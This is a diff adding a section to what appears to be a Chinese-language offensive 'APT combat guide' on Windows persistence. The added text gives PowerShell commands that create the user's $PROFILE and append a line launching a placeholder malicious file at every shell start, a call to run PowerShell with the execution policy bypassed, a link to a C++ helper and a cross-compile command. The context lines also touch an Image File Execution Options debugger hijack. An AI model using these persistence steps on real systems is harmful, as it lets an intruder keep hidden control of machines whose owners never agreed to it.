@@ -1069,3 +1069,20 @@ x86_64-w64-mingw32-g++ -O2 ifeo_debug.cpp -o ifeo_debug.exe -I/usr/share/mingw-w
 ```Bash
 Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mspaint.exe" -Name 'Debugger'
 ```
+
+### PowerShell配置文件
+
+```powershell
+echo $PROFILE
+Test-Path -Path $PROFILE
+New-Item -Path $PROFILE -ItemType File -Force
+Add-Content -Path $PROFILE -Value 'Start-Process "恶意文件路径"'
+powershell -executionpolicy bypass
+$PROFILE | select *
+```
+
+[config_powershell.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/config_powershell.cpp)
+
+```Bash
+x86_64-w64-mingw32-g++ -O2 config_powershell.cpp -o config_powershell.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+```
